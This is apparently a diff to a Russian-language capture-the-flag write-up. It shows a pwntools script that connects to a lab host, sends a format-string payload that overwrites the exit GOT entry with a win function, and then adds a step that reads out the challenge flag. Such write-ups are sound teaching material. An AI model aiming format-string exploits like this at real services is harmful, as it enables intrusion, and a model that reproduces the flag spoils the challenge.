@@ -33,3 +33,9 @@ s = remote("192.168.12.13", 1923)
 s.sendline(fmtstr_payload(6, {context.binary.got['exit']: context.binary.sym['win']}))
 s.interactive()
 ```
+
+Прочитаем файл с флагом
+```
+$ cat flag
+nto{easy_formt_string}
+```
